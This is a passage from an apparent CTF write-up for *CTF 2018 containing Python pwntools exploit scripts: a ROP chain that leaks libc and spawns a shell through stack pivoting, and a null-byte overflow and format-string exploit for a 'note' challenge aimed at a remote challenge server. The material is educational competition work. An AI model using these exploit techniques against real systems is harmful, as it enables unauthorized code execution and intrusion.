  for i in itertools.product(string.ascii_letters+string.digits,repeat=4):
    test="".join(i)+x
    k=hashlib.sha256()
    k.update(test)
    if k.hexdigest()==proof:
      print "find"
      r.sendline("".join(i))
      break
proofwork()
     


main=0x4009e7
poprdi=0x400c03
poprsi=0x400c01
read=0x4007e0
atoigot=0x601ff0
putsgot=0x601fb0
putplt=0x4007c0
buf=0x602f00
leave=0x400955
p1=p64(poprdi)+p64(putsgot)+p64(putplt)
p2=p64(poprdi)+p64(0)+p64(poprsi)+p64(buf+0x8)+p64(0)+p64(read)+p64(leave)
payload=p1+p2

# You can overflow the stack canary, the stack canary offset is 0x6128
print r.recvuntil("How many bytes do you want to send?")
r.sendline(str(6128))
r.send("a"*4112+p64(buf)+payload+"a"*(6128-4120-len(payload)))

# The first part of payload leak the libc base
r.recvuntil("It's time to say goodbye.\n")
libbase=u64(r.recvline()[:6]+"\x00\x00")-0x6f690
print hex(libbase)
system=libbase+0x45390
binsh=libbase+0x18cd57


# Using stack migration, you input payload again
r.sendline(p64(poprdi)+p64(binsh)+p64(system))



r.interactive()
# *ctf{h4ve_fun_w1th_0ld_tr1ck5_in_2018}
```

### note (sces60107)

You can find out the null-byte overflow in Edit note.

Then you also notice that the format string address is on the stack. You can overwrite it.

Cause the wrong rbp value, you can overwrite return value when calling scanf.

```python=
from pwn import *
import hashlib
import itertools
import string
import os
import time
r=remote("47.89.18.224", 10007)
#env = {'LD_PRELOAD': os.path.join(os.getcwd(),'./libc.so.6')}
#r=process("./note",env=env)
#context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

def proofwork():
  r.recvuntil('sha256(xxxx+')
  a=r.recvline()
  print a
  proof=a.split(" ")[-1]
  x=a.split(")")[0]
  proof=proof.strip()
  print r.recvuntil("xxxx:\n")
  for i in itertools.product(string.ascii_letters+string.digits,repeat=4):
    test="".join(i)+x
    k=hashlib.sha256()
    k.update(test)
    if k.hexdigest()==proof:
      print "find"
      r.sendline("".join(i))
      break


proofwork()
s=0x401129
fd=0x602140
printgot=0x601F90
poprdi=0x401003

# Not important
r.recvuntil("Input your ID:")
r.send(cyclic(256))


# You can trigger null-byte overflow
# They put "%d" address on the stack, but rbp is different cause null-byte overflow. Now you can assign other format string. I choose %256s
r.recvuntil("> ")
r.sendline("1")
r.recvuntil("Note:")
r.sendline("a"*168+p64(s)+"a"*(256-176))
r.recvuntil("> ")

# Now the note address can be changed, I have arbitrary read. Just leak libc base address.
r.sendline(p32(2)+p64(s)+p64(printgot))
r.recvuntil("Note:")
heapbase=r.recvline()
print heapbase.encode("hex")
```

---

*Truncated at 1200 lines. Full text: <https://github.com/balsn/ctf_writeup/blob/f9d99dc0f446376cb8a4882d09d80a37c8fa79cf/20180421-%2Actf/README.md>*
